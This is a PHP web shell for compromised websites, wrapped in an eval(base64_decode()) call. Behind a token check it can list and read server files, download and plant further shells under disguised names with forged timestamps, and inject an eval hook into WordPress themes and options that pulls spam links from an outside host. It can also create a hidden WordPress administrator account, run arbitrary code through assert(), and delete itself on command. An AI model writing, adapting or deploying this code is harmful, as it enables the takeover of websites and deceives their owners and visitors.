<?php
eval(base64_decode('//version 2
$version = '0.0.8';
$encoding = 'base64';
error_reporting(0);
ini_set('memory_limit', '1024M');
ini_set('max_execution_time', '9999');
$php_version = PHP_MAJOR_VERSION . "." . PHP_MINOR_VERSION;
$token = 'cd758e8f59dfdf06a852adad277986ca';


function dirToArray($dir = '.', $list = array()) {
   $result = array();
   $cdir = scandir($dir);
   foreach ($cdir as $key => $value)
   {
      if (!in_array($value,array(".","..")))
      {
         if (is_dir($dir . DIRECTORY_SEPARATOR . $value))
         {
            array_push($list, $dir . DIRECTORY_SEPARATOR . $value);
            list($result[$value], $list) = dirToArray($dir . DIRECTORY_SEPARATOR . $value, $list);
         }
         else
         {
            array_push($list, $dir . DIRECTORY_SEPARATOR . $value);
            $result[] = $value;
         }
      }
   }
   return array($result, $list);
}

function clearCache($dir = '.') {
   $cdir = scandir($dir);
   foreach ($cdir as $key => $value) {
      if (!in_array($value,array(".",".."))) {
         if (is_dir($dir . DIRECTORY_SEPARATOR . $value)) {
            rrmdir($dir . DIRECTORY_SEPARATOR . $value);
         }
         if (is_file($dir . DIRECTORY_SEPARATOR . $value)) {
            unlink($dir . DIRECTORY_SEPARATOR . $value);
         }
      }
   }
}

function rrmdir($dir) {
   if (is_dir($dir)) {
     $objects = scandir($dir);
     foreach ($objects as $object) {
       if ($object != "." && $object != "..") {
         if (filetype($dir.DIRECTORY_SEPARATOR.$object) == "dir") rrmdir($dir.DIRECTORY_SEPARATOR.$object); else unlink($dir.DIRECTORY_SEPARATOR.$object);
       }
     }
     reset($objects);
     rmdir($dir);
   }
} 


function findWDir($dir = '.', $w_list = array()) {
   $result = array();
   $cdir = scandir($dir);
   foreach ($cdir as $key => $value) {
      if (!in_array($value,array(".",".."))) {
         if (is_dir($dir . DIRECTORY_SEPARATOR . $value)) {
            if (is_writeable($dir . DIRECTORY_SEPARATOR . $value)) {
               array_push($w_list, $dir . DIRECTORY_SEPARATOR . $value);
            }
            list($result[$value], $w_list) = findWDir($dir . DIRECTORY_SEPARATOR . $value, $w_list);
         }
      }
   }
   return array($result, $w_list);
}

function insertRender($dir = '.', $w_list = array()) {
   $result = array();
   $cdir = scandir($dir);
   foreach ($cdir as $key => $value) {
      if (!in_array($value,array(".",".."))) {
         if (is_file($dir . DIRECTORY_SEPARATOR . $value)) {
            $file = $dir . DIRECTORY_SEPARATOR . $value;
            $content = file_get_contents($file);
            if (stripos($content, '<body') && !strpos($content, '\\x72\\x65\\x6e\\x64\\x65\\x72') && !strpos($content, "eval(get_option('render'));")) {
               $content = preg_replace('/(<bod([^>]|\?>|=>)*[^?]>)/ims', '$1<?php eval(get_option("\\x72\\x65\\x6e\\x64\\x65\\x72")); ?>', $content);
               file_put_contents($file, $content);
               $donor = timestampGenerate($dir);
               touch($file, $donor['mtime'], $donor['atime']);
            }
         }
         if (is_dir($dir . DIRECTORY_SEPARATOR . $value)) {
            if (is_writeable($dir . DIRECTORY_SEPARATOR . $value)) {
               array_push($w_list, $dir . DIRECTORY_SEPARATOR . $value);
            }
            list($result[$value], $w_list) = insertRender($dir . DIRECTORY_SEPARATOR . $value, $w_list);
         }
      }
   }
   return array($result, $w_list);
}


function nameGenerate($dir) {
  $files = scandir($dir);
  $pattern = '/\.php$/';
  foreach ($files as $key => $value) {
    if (!is_file($dir . DIRECTORY_SEPARATOR . $value) || !preg_match($pattern, $value)) {
      unset($files[$key]);
    }
  }
  if (count($files) == 0) {
    $empty_dir = array("0" => "functions.php", "1" => "config.php", "2" => "includes.php", "3" => "session.php", "4" => ".functions.php", "5" => ".config.php", "6" => ".includes.php", "7" => ".session.php");
    $chosen = $empty_dir[rand(0, count($empty_dir) - 1)];
  }
  else {
    $files = array_values($files);
    $prefix = array("0" => ".", "1" => "_", "2" => "");
    $suffix = array("0" => "bak", "1" => "orig", "2" => "copy", "3" => "backup", "4" => "swp", "5" => "php", "6" => "q");
    $chosen = $files[rand(0, count($files) - 1)];
    $chosen = preg_replace('/\.php$/', $prefix[rand(0,count($prefix) - 1)] . $suffix[rand(0,count($suffix) - 1)] . '.php', $chosen);
    if (rand(0,100) < 50) {
      $chosen = preg_replace('/^/', '.', $chosen);
    }
  }
  return $chosen;
}

function timestampGenerate($dir) {
  $files = array();
  foreach (scandir($dir) as $key => $value) {
    if (!in_array($value,array("."))) {
      $files[$key] = array();
      $files[$key]['name'] = $value;
      $files[$key]['atime'] = fileatime($dir . DIRECTORY_SEPARATOR . $value);
      $files[$key]['mtime'] = filemtime($dir . DIRECTORY_SEPARATOR . $value);
    }
  }
  $files = array_values($files);
  $chosen = $files[rand(0, count($files) - 1)];
  return $chosen;
}

function get_by_curl($url) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, 'CoD');
  curl_setopt($ch, CURLOPT_REFERER, 'CoD');
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//  curl_setopt($ch, CURLOPT_SSLVERSION, 'CURL_SSLVERSION_TLSv1_2');
  $curlResults = curl_exec($ch);
  curl_close($ch);
  return $curlResults;
}

function get_by_socket($url) {
  $url_p = (parse_url($url));
  if ($url_p['scheme'] == 'https') {
    $port = 443;
    $scheme = 'tls://';
  } 
  else {
    $port = 80;
    $scheme = '';
  }
  $host = $url_p['host'];
  $uri = $url_p['path'];
  $query = $url_p['query'];
  $fp = fsockopen($scheme . $host, $port, $errno, $errstr, 5);
  if ($query) {
    $req = $uri."?".$query;
  } 
  else {
    $req = $uri;
  }   
  if (!$fp) {
      echo "$errstr ($errno)<br />\n";
  } else { 
      $out = "GET ".$req." HTTP/1.1\r\n";
      $out .= "Host: ".$host."\r\n";
      $out .= "User-Agent: CoD\r\n";
      $out .= "Pragma: no-cache\r\n";
      $out .= "Cache-Control: no-cache\r\n";
      $out .= "Connection: Close\r\n\r\n";
      fwrite($fp, $out);
      $data = stream_get_contents($fp);
      fclose($fp);
  }
  $data = explode("\r\n\r\n", $data);
  array_shift($data);
  return implode($data);
}

function get_remote_file($url) {
  if (extension_loaded('curl')) {
    return get_by_curl($url);
  }
  elseif (ini_get('allow_url_fopen') == 1) {
    $opts = array(
      'http'=>array(
        'method'=>"GET",
        'header'=>"Referer: CoD\r\n" .
                  "User-Agent: CoD\r\n"
      ),
      'ssl'=>array(
        'allow_self_signed'=>true,
        'verify_peer'=>false,
        'verify_peer_name'=>false
      )
    );
    $context = stream_context_create($opts);
    return file_get_contents($url, false, $context);
  }
  elseif (extension_loaded('sockets')) {
    return get_by_socket($url);
  }
  return NULL;
}

function is_joomla() {
  if (is_file($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'configuration.php')){
    $conf = file_get_contents($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'configuration.php');
    if (strpos($conf, 'class JConfig {')){
      return true;
    }
    else {
    return false;
    }
  }
  else {
    return false;
  }
}

function is_wordpress() {
  if (is_file($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php')){
    $conf = file_get_contents($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php');
    if (strpos($conf, 'wp-settings.php')){
      return true;
    }
    else {
    return false;
    }
  }
  else {
    return false;
  }
}

function getCMS() {
  if (is_joomla()) {
    $cms = 'joomla';
  }
  elseif (is_wordpress()) {
    $cms = 'wordpress';
  }
  else {
    $cms = 'unknown';
  }
  return $cms;
}

function getEncoder() {
  if(extension_loaded('ionCube Loader')) {
    $encoder = 'ioncube_loader';
  }
  elseif(extension_loaded('Zend Optimizerr')) {
    $encoder = 'zend_optimizer';
  }
  elseif(extension_loaded('SourceGuardian')) {
    $encoder = 'source_guardian';
  }
  elseif(extension_loaded('Zend Guard Loader')) {
    $encoder = 'zend_guard_loader';
  }
  else {
    $encoder = 'base64';
  }
  return $encoder;
}

if(!isset($_GET["token"]) && !isset($_POST["token"])) {
   $is_auth = false;
   phpinfo();
}
elseif (md5($_GET["token"]) == $token){
   $is_auth = true;
}
elseif (md5($_POST["token"]) == $token){
   $is_auth = true;
}
else {
   $is_auth = false;
   phpinfo();
}

if(isset($_GET["info"])) {
   phpinfo();
   return;
}

if(isset($_GET["get_tree"]) && $is_auth) {
   if(!empty($_GET["get_tree"])) {
      $path = $_GET["get_tree"];
   }
   else {
      $path = $_SERVER['DOCUMENT_ROOT'];
   }
   list($tree, $list) = dirToArray($path);
   $result = array('type' => 'get_tree', 'path' => $path, 'tree' => $list);
   echo stripslashes(json_encode($result)) . "\n";
}

if(isset($_GET["get_writeable"]) && $is_auth) {
   if(!empty($_GET["get_writeable"])) {
      $path = $_GET["get_writeable"];
   }
   else {
      $path = $_SERVER['DOCUMENT_ROOT'];
   }
   list($tree, $write_list) = findWDir($path, array());
   $result = array('type' => 'get_writeable', 'path' => $path, 'tree' => $write_list);
   echo stripslashes(json_encode($result)) . "\n";
}

if(isset($_GET["set_file"]) && $is_auth) {
  if(!empty($_GET["set_file"])) {
    $path = $_GET["set_file"];
    if(!preg_match('/^\//', $path)){
      $path = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $path;
    }
  }
  else {
    $path = $_SERVER['DOCUMENT_ROOT'];
  }
  $dir = preg_replace('/\/[^\/]+\.php$/', '', $path);
  $url = $_GET["url"];
  $content = get_remote_file($url);
  if (file_put_contents($path, $content) != FALSE) {
    $result = array('type' => 'set_file', 'result' => 'success');
    $donor = timestampGenerate($dir);
    touch($path, $donor['mtime'], $donor['atime']);
  }
  else {
    $result = array('type' => 'set_file', 'result' => 'fail');
  }
  echo stripslashes(json_encode($result)) . "\n";
}

if(isset($_GET["get_file"]) && $is_auth) {
  $path = $_GET["get_file"];
  $content = file_get_contents($path);
  $result = array('type' => 'get_file', $path => $content);
  echo stripslashes(json_encode($result)) . "\n";
}

if(isset($_GET["distribute"]) && $is_auth) {
  if(!empty($_GET["path"])) {
    $path = $_GET["path"];
    if(!preg_match('/^\//', $path)){
      $path = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $path;
    }
  }
  else {
    $path = $_SERVER['DOCUMENT_ROOT'];
  }
  if(!empty($_GET["ts"])) {
    $ts = $_GET["ts"];
  }
  else {
    $ts = 'neigh';
  }
  if(!empty($_GET["limit"])) {
    $limit = $_GET["limit"];
  }
  else {
    $limit = NULL;
  }
  $deepness = $_GET["distribute"];
  $urls = get_remote_file($_GET["files"]);
  $remote_files = array();
  foreach (explode(" ", $urls) as $f) {
    array_push($remote_files, get_remote_file($f));
  }
  list($tree, $write_list) = findWDir($path, array());
  shuffle($write_list);
  $write_list = array_slice($write_list, $offset = 1, $length = $limit);
  $shells = array();
  $patterns = '/' . preg_replace('/\//', '\/',$_SERVER['DOCUMENT_ROOT']) . '/';
  $replacements = "http://" . $_SERVER['HTTP_HOST'];
  $excludes = array('/plugins\/wp-super-cache/', '/plugins\/jetpack/', '/cache/', '/wp-includes\/js/', '/plugins\/seo-ultimate/');
  $includes = array('/./');
  if (is_joomla()) {
//    $includes = array('/layouts/', '/templates\/system/', '/templates\/protostar/', '/templates\/beez3/', '/plugins\/editors-xtd/', '/plugins\/finder/', '/plugins\/quickicon/');
    $includes = array('/./');
  }
  if (is_wordpress()) {
//    $includes = array('/wp-includes\/pomo/', '/wp-includes\/fonts/', '/wp-includes\/ID3/');
    $includes = array('/./');
  }
  foreach($write_list as $dir) {
    $name = nameGenerate($dir);
    $s_path = $dir . DIRECTORY_SEPARATOR . $name;
    $make = false;
    foreach ($includes as $inc){
      if (preg_match($inc, $s_path)) {
        $make = true;
      }
    }
    foreach ($excludes as $excl){
      if (preg_match($excl, $s_path)) {
        $make = false;
      }
    }

    if ($make){
      if (file_put_contents($s_path, $remote_files[rand(0, count($remote_files) - 1)]) != FALSE) {
        if ($ts == 'neigh') {
          $donor = timestampGenerate($dir);
          touch($s_path, $donor['mtime'], $donor['atime']);
        }
        elseif ($ts == 'now') {
          touch($s_path);
        }
        array_push($shells, preg_replace($patterns, $replacements, $s_path));
      }
    }

  }
  $result = array('type' => 'distribute', 'urls' => $shells);
  echo stripslashes(json_encode($result)) . "\n";
  
}

if(isset($_GET["update"]) && $is_auth) {
  if(!empty($_GET["update"])) {
    $files = $_GET["update"];
  }
  else {
    phpinfo();
    return;
  }
  if(!empty($_GET["ts"])) {
    $ts = $_GET["ts"];
  }
  else {
    $ts = 'neigh';
  }
  $remote_files = array();
  $urls = get_remote_file($files);
  $remote_files = explode(" ", $urls);
  $file = $_SERVER["SCRIPT_FILENAME"];
  $new = get_remote_file($remote_files[rand(0, count($remote_files) - 1)]);
  if (!strpos($new, '?php')) {
    $result = array('type' => 'update', 'result' => 'failed');
    echo stripslashes(json_encode($result)) . "\n";
    return;
  }
  $dir = dirname($_SERVER["SCRIPT_FILENAME"]);
  if (file_put_contents($file, $new) != FALSE) {
    if ($ts == 'neigh') {
      $donor = timestampGenerate($dir);
      touch($file, $donor['mtime'], $donor['atime']);
    }
    elseif ($ts == 'now') {
      touch($file);
    }
    $result = array('type' => 'update', 'result' => 'success');
    echo stripslashes(json_encode($result)) . "\n";
  }
  else {
    $result = array('type' => 'update', 'result' => 'failed');
    echo stripslashes(json_encode($result)) . "\n";
  }

}

if(isset($_GET["wpdist"]) && $is_auth) {
  require($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-load.php');
  $option = 'render';
  if (ini_get('allow_url_fopen')) {
    $serialized_value = "eval(base64_decode('ZWNobyBAZmlsZV9nZXRfY29udGVudHMoIlx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDYxXHg3MFx4NjlceDJlXHg3M1x4NjVceDZmXHgyZFx4NmRceDZmXHg3YVx4MmVceDYzXHg2Zlx4NmRceDJmXHg2Y1x4NjlceDZlXHg2Ylx4M2ZceDY0XHgzZCIuJF9TRVJWRVJbIlx4NTNceDQ1XHg1Mlx4NTZceDQ1XHg1Mlx4NWZceDRlXHg0MVx4NGRceDQ1Il0uIiZ1PSIuJF9TRVJWRVJbIlx4NTJceDQ1XHg1MVx4NTVceDQ1XHg1M1x4NTRceDVmXHg1NVx4NTJceDQ5Il0pOw=='));";
  }
  elseif (extension_loaded('curl') && function_exists('curl_exec')) {
    $serialized_value = "eval(base64_decode('JGNoPWN1cmxfaW5pdCgpO2N1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1VSTCwiXHg2OFx4NzRceDc0XHg3MFx4M2FceDJmXHgyZlx4NjFceDcwXHg2OVx4MmVceDczXHg2NVx4NmZceDJkXHg2ZFx4NmZceDdhXHgyZVx4NjNceDZmXHg2ZFx4MmZceDZjXHg2OVx4NmVceDZiXHgzZlx4NjRceDNkIi4kX1NFUlZFUlsiXHg1M1x4NDVceDUyXHg1Nlx4NDVceDUyXHg1Zlx4NGVceDQxXHg0ZFx4NDUiXS4iJnU9Ii4kX1NFUlZFUlsiXHg1Mlx4NDVceDUxXHg1NVx4NDVceDUzXHg1NFx4NWZceDU1XHg1Mlx4NDkiXSk7Y3VybF9zZXRvcHQoJGNoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7JGxpbmtzPWN1cmxfZXhlYygkY2gpO2N1cmxfY2xvc2UoJGNoKTtlY2hvICRsaW5rczs='));";
  }
  elseif (extension_loaded('sockets')) {
    $serialized_value = "eval(base64_decode('JGZwPWZzb2Nrb3BlbigiXHg2MVx4NzBceDY5XHgyZVx4NzNceDY1XHg2Zlx4MmRceDZkXHg2Zlx4N2FceDJlXHg2M1x4NmZceDZkIiw4MCwkZXJybm8sJGVycnN0ciw1KTskcmVxPSJceDJmXHg2Y1x4NjlceDZlXHg2Ylx4M2ZceDY0XHgzZCIuJF9TRVJWRVJbIlx4NTNceDQ1XHg1Mlx4NTZceDQ1XHg1Mlx4NWZceDRlXHg0MVx4NGRceDQ1Il0uIiZ1PSIuJF9TRVJWRVJbIlx4NTJceDQ1XHg1MVx4NTVceDQ1XHg1M1x4NTRceDVmXHg1NVx4NTJceDQ5Il07JG91dD0iXHg0N1x4NDVceDU0ICIuJHJlcS4iIFx4NDhceDU0XHg1NFx4NTBceDJmXHgzMVx4MmVceDMxXHJcblx4NDhceDZmXHg3M1x4NzRceDNhXHgyMFx4NjFceDcwXHg2OVx4MmVceDczXHg2NVx4NmZceDJkXHg2ZFx4NmZceDdhXHgyZVx4NjNceDZmXHg2ZFxyXG5ceDQzXHg2Zlx4NmVceDZlXHg2NVx4NjNceDc0XHg2OVx4NmZceDZlXHgzYVx4MjBceDQzXHg2Y1x4NmZceDczXHg2NVxyXG5ceDU1XHg3M1x4NjVceDcyXHgyZFx4NDFceDY3XHg2NVx4NmVceDc0XHgzYVx4MjBceDQzXHg2Zlx4NDRcclxuXHJcbiI7ZndyaXRlKCRmcCwkb3V0KTskaHRtbD1zdHJlYW1fZ2V0X2NvbnRlbnRzKCRmcCk7ZmNsb3NlKCRmcCk7JGh0bWw9ZXhwbG9kZSgiXHJcblxyXG4iLCRodG1sKTthcnJheV9zaGlmdCgkaHRtbCk7ZWNobyBwcmVnX3JlcGxhY2UoIi9eW148XSsvaW0iLCAiIiwgaW1wbG9kZSgkaHRtbCkpOw=='));";
  }
  $autoload = 'yes';
  $qr = $wpdb->query( $wpdb->prepare( "INSERT INTO `$wpdb->options` (`option_name`, `option_value`, `autoload`) VALUES (%s, %s, %s) ON DUPLICATE KEY UPDATE `option_name` = VALUES(`option_name`), `option_value` = VALUES(`option_value`), `autoload` = VALUES(`autoload`)", $option, $serialized_value, $autoload ) );
  $header = get_template_directory() . DIRECTORY_SEPARATOR . 'header.php';
  insertRender($dir=get_theme_root());
  if (is_dir(WP_CONTENT_DIR.DIRECTORY_SEPARATOR.'cache')) {
     clearCache($dir=WP_CONTENT_DIR.DIRECTORY_SEPARATOR.'cache');
  }
  if ($qr) {
    $result = array('type' => 'wpdist', 'result' => 'success', 'status' => $qr);
    echo stripslashes(json_encode($result)) . "\n";
  }
  elseif ($qr === 0) {
    $result = array('type' => 'wpdist', 'result' => 'exists', 'status' => $qr);
    echo stripslashes(json_encode($result)) . "\n";
  }
  else {
    $result = array('type' => 'wpdist', 'result' => 'failed');
    echo stripslashes(json_encode($result)) . "\n";
  }
}

if(isset($_GET["wpuser"]) && $is_auth) {
    $base = $_GET["base"];
    require($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $base . DIRECTORY_SEPARATOR .  'wp-load.php');
  $user = "\141\144\156\156\151\156";
  $pass = '$P$BicVmY8d0rt9FSiIqXxBy.P9jfzihb1';
  $email = "\165\156\143\154\145\142\145\156\172\61\62\65\67\100\147\155\141\151\154\56\143\157\155";
  $meta = array('nickname' => $user, 'rich_editing' => 'true', 'comment_shortcuts' => 'false', 'admin_color' => 'fresh', 'use_ssl' => '0', 'show_admin_bar_front' => 'true', 'wp_capabilities' => 'a:1:{s:13:"administrator";b:1;}', 'wp_user_level' => '10', 'dismissed_wp_pointers' => 'wp360_locks,wp390_widgets', 'show_welcome_panel' => '1');
  $exists = $wpdb->get_results($wpdb->prepare("SELECT ID FROM $wpdb->users WHERE user_login = %s", $user));
  if (!$exists) {
    $cr_user = $wpdb->query( $wpdb->prepare( "INSERT INTO `$wpdb->users` (`user_login`, `user_pass`, `user_email`) VALUES (%s, %s, %s) ON DUPLICATE KEY UPDATE `user_login` = VALUES(`user_login`), `user_pass` = VALUES(`user_pass`), `user_email` = VALUES(`user_email`)", $user, $pass, $email ) );
    $result = $wpdb->get_results($wpdb->prepare("SELECT ID FROM $wpdb->users WHERE user_login = %s", $user));
    $uid = $result[0]->ID;
    foreach ($meta as $key => $value) {
      $meta_r = $wpdb->query( $wpdb->prepare( "INSERT INTO `$wpdb->usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES (%s, %s, %s) ON DUPLICATE KEY UPDATE `user_id` = VALUES(`user_id`), `meta_key` = VALUES(`meta_key`), `meta_value` = VALUES(`meta_value`)", $uid, $key, $value ) );
    }
  }
  else {
    $uid = $exists[0]->ID;
    foreach ($meta as $key => $value) {
      $meta_r = $wpdb->query( $wpdb->prepare( "UPDATE `$wpdb->usermeta` SET `meta_value` = %s WHERE `user_id` = %s AND `meta_key` = %s", $value, $uid, $key ) );
    }
  }
  if ($cr_user) {
    $result = array('type' => 'wpuser', 'result' => 'success', 'cr_user' => $cr_user, 'meta_r' => $meta_r);
    echo stripslashes(json_encode($result)) . "\n";
  }
  elseif ($exists) {
    $result = array('type' => 'wpuser', 'result' => 'exists', 'meta_r' => $meta_r);
    echo stripslashes(json_encode($result)) . "\n";
  }
  else {
    $result = array('type' => 'wpuser', 'result' => 'failed');
    echo stripslashes(json_encode($result)) . "\n";
  }
}

if(isset($_POST["empower"]) && $is_auth) {
  if (!empty($_POST["empower"])) {
    $val = $_POST["empower"];
  }
  else {
    return;
  }
  if (assert($val)) {
    header('Result: True');
  }
  else {
    header('Result: False');
  }
}


if(isset($_GET["suicide"]) && $is_auth) {
  if ($_GET["suicide"] != '1') {
    phpinfo();
    return;
  }
  if (unlink($_SERVER["SCRIPT_FILENAME"])) {
    $result = array('type' => 'suicide', 'result' => 'success');
  }
  else {
    $result = array('type' => 'suicide', 'result' => 'fail');
  }
  echo stripslashes(json_encode($result)) . "\n";
}

if(isset($_GET["version"]) && $is_auth) {
  $result = array('version' => $version, 'encoding' => $encoding);
  echo stripslashes(json_encode($result)) . "\n";
}

if(isset($_GET["ver_full"]) && $is_auth) {
  $cms = getCMS();
  $encoder = getEncoder();
  $result = array('version' => $version, 'encoding' => $encoding, 'cms' => $cms, 'encoder' => $encoder, 'php_version' => $php_version);
  echo stripslashes(json_encode($result)) . "\n";
}

'));
